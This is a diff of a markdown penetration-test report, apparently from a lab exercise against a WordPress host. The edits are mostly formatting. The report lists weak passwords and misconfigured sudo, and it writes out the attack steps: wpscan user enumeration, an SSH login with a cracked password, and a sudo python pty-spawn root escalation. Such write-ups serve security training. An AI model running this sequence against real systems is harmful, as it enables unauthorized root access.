@@ -25,15 +25,15 @@ This scan identifies the services below as potential points of entry:
 ## Critical Vulnerabilities
 
 The following vulnerabilities were identified on each target:
-- Target 1
-  1. <ins>**PORT ENUMERATION**</ins> (Severity: MEDIUM)
+###- Target 1
+  1. <ins>**PORT ENUMERATION**</ins> (Severity: **MEDIUM**)
 	- Target1 is open and responsive to ping requests allow port enumeration
-  2. <ins>**WEAK PASSWORD POLICY**</ins> (Severity HIGH)
+  2. <ins>**WEAK PASSWORD POLICY**</ins> (Severity: **HIGH**)
 	- User 'Michael' was able to use their username as password, no numerical or spacial characters were required.
 	- OpenSSH was not configured to require further authentication beyond a simple password
-  3. <ins>**MISCONFIGURED WEBSITE**</ins> (Severity: HIGH)
+  3. <ins>**MISCONFIGURED WEBSITE**</ins> (Severity: **HIGH**)
 	- Sensitive data was found within public-facing source code. In addition password information saved within the MySQL database was unsalted, resulting in easily obtained user credentials.
-  3. <ins>**PYTHON ESCALATION**</ins> (Severity: MEDIUM-HIGH)
+  3. <ins>**PYTHON ESCALATION**</ins> (Severity: **MEDIUM-HIGH**)
 	- User Steven's `sudo` privileges were misconfigured allowing for the leverage of a known python script exploit
 
 
@@ -45,7 +45,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - **Exploit Used**
         - WPScan to enumerate users of the Target 1 WordPress site
     - Command: 
-        - `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`.
+        - `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`
 
 
                 <img src="/Images/wpscan-users.png">
@@ -110,14 +110,14 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - <img src="/Images/john-show.png">
 
             - Once Steven’s password hash was cracked, the next step was to open an SSH shell as Steven. Since Steven's account had `sudo` privileges a python script vulnerability was leveraged to gain root access.
-            - Commands: 
-               			 - `ssh steven@192.168.1.110`
-               			 - `pw:pink84`
-               			 - `sudo -l`
-               			 - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
-                			- `cd /root`
-               			 - `ls`
-               			 - `cat flag4.txt`
+                - Commands: 
+                    - `ssh steven@192.168.1.110`
+                    - `pw:pink84`
+                    - `sudo -l`
+                    - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
+                    - `cd /root`
+                    - `ls`
+                    - `cat flag4.txt`
 
 		- Python Escalate
 			- <img src="/Images/python-escalate.png">
